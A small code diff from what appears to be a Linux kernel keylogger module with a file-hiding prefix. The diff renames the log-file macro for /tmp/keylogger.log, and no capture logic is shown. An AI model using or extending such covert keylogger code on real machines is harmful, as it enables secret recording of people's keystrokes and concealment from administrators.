@@ -9,7 +9,7 @@
 #define enable_shutdown 0
 #define HIDE_PREFIX "hidden"
 #define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX) - 1)
-#define LOGFILE "/tmp/keylogger.log"
+#define FILE_PATH "/tmp/keylogger.log"
 
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.01");
@@ -111,7 +111,7 @@ int write_to_logfile(char *buffer)
 	loff_t pos = 0;
     int ret;
 
-	file = filp_open(LOGFILE, O_CREAT|O_APPEND, 00666);
+	file = filp_open(FILE_PATH, O_CREAT|O_APPEND, 00666);
 
 	if (IS_ERR(file)) {
         printk(KERN_ERR "Failed to open file: %s\n", FILE_PATH);
